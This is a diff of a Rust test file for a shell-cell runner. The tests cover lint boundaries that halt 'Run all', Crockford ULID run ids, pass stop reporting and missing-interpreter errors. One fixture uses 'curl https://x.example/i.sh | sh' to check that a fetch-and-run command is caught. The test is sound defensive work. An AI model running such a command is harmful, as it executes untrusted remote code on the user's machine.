@@ -150,7 +150,7 @@ fn press_refusals() {
     let seen = i.presented.digest.clone();
     assert_eq!(
         refuse(&i, &seen, &RunMode::Cell).unwrap_err(),
-        CellsError::Invalid("cwd_missing".into())
+        CellsError::Invalid("a chat cell needs `cwd`".into())
     );
     // No such message / ordinal → nothing to run.
     assert!(Cells::inspect(&t, &chat(s, 6, 1), home).is_none());
@@ -183,14 +183,30 @@ fn run_all_stops_before_danger_and_blocking_lint() {
         chat::cells_of(&body).remove(0)
     };
     let plain = cell(&["cwd: /tmp"], "ls");
-    assert!(!stops_pass(&plain.cell, &surface::cell::lint(&plain.cell)));
+    assert_eq!(pass_boundary(&plain.cell, &surface::cell::lint(&plain.cell)), None);
     let danger = cell(&["cwd: /tmp", "danger"], "ls");
-    assert!(stops_pass(&danger.cell, &surface::cell::lint(&danger.cell)));
+    assert_eq!(
+        pass_boundary(&danger.cell, &surface::cell::lint(&danger.cell)).as_deref(),
+        Some("danger — runs from its button only")
+    );
     let curl = cell(&["cwd: /tmp"], "curl https://x.example/i.sh | sh");
-    assert!(stops_pass(&curl.cell, &surface::cell::lint(&curl.cell)));
+    assert!(pass_boundary(&curl.cell, &surface::cell::lint(&curl.cell)).is_some_and(|w| !w.is_empty()));
     // `sudo` is a chip but does not stop Run all.
     let sudo = cell(&["cwd: /tmp"], "sudo ls");
-    assert!(!stops_pass(&sudo.cell, &surface::cell::lint(&sudo.cell)));
+    assert_eq!(pass_boundary(&sudo.cell, &surface::cell::lint(&sudo.cell)), None);
+}
+
+/// B18: engine-minted ids have the clients' shape (`r_` + 26 Crockford chars) and time order.
+#[test]
+fn pass_run_ids_are_crockford_ulids() {
+    let a = format!("r_{}", crockford(uuid::Uuid::now_v7().as_u128()));
+    std::thread::sleep(Duration::from_millis(2));
+    let b = format!("r_{}", crockford(uuid::Uuid::now_v7().as_u128()));
+    let re = regex::Regex::new("^r_[0-9A-HJKMNP-TV-Z]{26}$").unwrap();
+    assert!(re.is_match(&a) && re.is_match(&b), "{a} {b}");
+    assert!(a < b);
+    assert_eq!(crockford(0), "0".repeat(26));
+    assert_eq!(crockford(u128::MAX), format!("7{}", "Z".repeat(25)));
 }
 
 /// §9.3 rows.
@@ -692,6 +708,7 @@ async fn e2e_real_shells() {
     if !Path::new("/bin/bash").is_file() {
         return;
     }
+    let _one = note::DOCS_TEST.lock().await;
     let tmp = tempfile::tempdir().unwrap();
     let dir = tmp.path().canonicalize().unwrap();
     std::fs::create_dir_all(dir.join("sub")).unwrap();
@@ -901,6 +918,48 @@ async fn e2e_real_shells() {
     let (_, out) = b.run(15, RunMode::Cell, "r_fresh").await;
     assert!(out.contains("mark=fresh"), "{out:?}");
 
+    // B11: a Run all pass reports where and why it stopped (note scope: the docs are a fake).
+    let doc = DocId("d-pass".into());
+    let blocks: HashMap<String, String> = [
+        ("ok1", format!("#| cwd: {d}\necho one")),
+        ("ok2", format!("#| cwd: {d}\necho two")),
+        ("gone", format!("#| cwd: {d}/missing\necho never")),
+        ("miss", format!("#| cwd: {d}\n#| expect: NOPE\necho one")),
+    ]
+    .into_iter()
+    .map(|(k, v)| (k.to_owned(), v))
+    .collect();
+    note::set_docs(Arc::new(Blocks(blocks.clone())));
+    let note_cell = |n: &str| CellRef::Note {
+        doc: doc.clone(),
+        key: NoteKey::Block(n.into()),
+    };
+    let pass = |id: &str, names: &[&str]| {
+        let req = RunAllRequest {
+            scope: Scope::Doc(doc.clone()),
+            cells: names
+                .iter()
+                .map(|n| (note_cell(n), surface::cell::digest(&blocks[*n])))
+                .collect(),
+            pass: id.into(),
+            pressed_by: "desktop · test".into(),
+        };
+        pass_end(cells.clone(), req)
+    };
+    let p = pass("p_before", &["ok1", "gone", "ok2"]).await;
+    let s = p.stopped.expect("stopped");
+    assert_eq!((s.cell, s.before, p.ran, p.total), (note_cell("gone"), true, 1, 3));
+    assert!(!s.why.is_empty());
+    let p = pass("p_at", &["ok1", "miss", "ok2"]).await;
+    let s = p.stopped.expect("stopped");
+    assert_eq!((s.cell, s.before, p.ran), (note_cell("miss"), false, 2));
+    assert_eq!(s.why, "expect missed 1/1");
+    let p = pass("p_clean", &["ok1", "ok2"]).await;
+    assert_eq!((p.stopped, p.ran, p.total), (None, 2, 2));
+    for k in cells.kernels_of(&Scope::Doc(doc.clone())) {
+        cells.kernel_close(k.id).await.unwrap();
+    }
+
     // Inv. 13: every RunFinished came after its final row.
     tokio::time::sleep(Duration::from_millis(200)).await;
     let seen = seen.lock().clone();
@@ -929,6 +988,87 @@ fn walk(dir: &Path) -> Vec<PathBuf> {
         }
     }
     out
+}
+
+/// Start a Run all pass and wait for its end on `cell_state` (B11).
+async fn pass_end(cells: Cells, req: RunAllRequest) -> PassEnd {
+    let (scope, id) = (req.scope.clone(), req.pass.clone());
+    cells.run_all(req).await.unwrap();
+    let deadline = Instant::now() + Duration::from_secs(30);
+    loop {
+        let s = cells.state(scope.clone(), Vec::new()).await.unwrap();
+        if let Some(p) = s.pass.filter(|p| p.pass == id) {
+            return p;
+        }
+        assert!(Instant::now() < deadline, "pass {id} never ended");
+        tokio::time::sleep(Duration::from_millis(20)).await;
+    }
+}
+
+/// The document side of note scope: blocks by name, no markdown, the owner wrote them.
+struct Blocks(HashMap<String, String>);
+
+#[async_trait::async_trait]
+impl note::Docs for Blocks {
+    async fn code_block(&self, _: &DocId, key: &NoteKey) -> Result<note::NoteSource, String> {
+        let (NoteKey::Name(n) | NoteKey::Block(n)) = key;
+        let text = self.0.get(n).ok_or_else(|| format!("no block {n}"))?;
+        Ok(note::NoteSource {
+            block: n.clone(),
+            language: if n.starts_with("ps") { "pwsh" } else { "bash" }.into(),
+            text: text.clone(),
+            last_author: crate::types::Principal::Owner { device: None },
+        })
+    }
+    async fn hub(&self) -> Result<Option<String>, String> {
+        Ok(None)
+    }
+    async fn markdown(&self, _: &DocId) -> Option<String> {
+        None
+    }
+    async fn title(&self, _: &DocId) -> Option<String> {
+        None
+    }
+    async fn bound_sessions(&self, _: &DocId) -> Vec<SessionId> {
+        Vec::new()
+    }
+    async fn put_latest(&self, _: CellLatest) -> Result<(), String> {
+        Ok(())
+    }
+    async fn latest(&self, _: &DocId) -> Result<Vec<CellLatest>, String> {
+        Ok(Vec::new())
+    }
+}
+
+/// B19: a cell whose interpreter is missing is invalid on `cell_state`, with the reason.
+#[tokio::test]
+async fn missing_interpreter_is_an_error_problem() {
+    let _one = note::DOCS_TEST.lock().await;
+    let dir = tempfile::tempdir().unwrap();
+    let cells = cells_in(dir.path()).await;
+    if ["/usr/bin/pwsh", "/bin/pwsh", "/usr/bin/powershell"]
+        .iter()
+        .any(|p| Path::new(p).is_file())
+    {
+        return; // the test PATH is /usr/bin:/bin
+    }
+    let text = format!("#| cwd: {}\nGet-Date", dir.path().display());
+    note::set_docs(Arc::new(Blocks([("ps1".to_owned(), text)].into())));
+    let cell = CellRef::Note {
+        doc: DocId("d-pwsh".into()),
+        key: NoteKey::Block("ps1".into()),
+    };
+    let s = cells
+        .state(Scope::Doc(DocId("d-pwsh".into())), vec![cell])
+        .await
+        .unwrap();
+    let p = s.cells[0]
+        .problems
+        .iter()
+        .find(|p| p.code == "no_interpreter")
+        .expect("no_interpreter");
+    assert_eq!(p.severity, Severity::Error);
+    assert_eq!(p.message, "no pwsh on this machine");
 }
 
 /// The document side of note scope: one block, any key, no markdown.
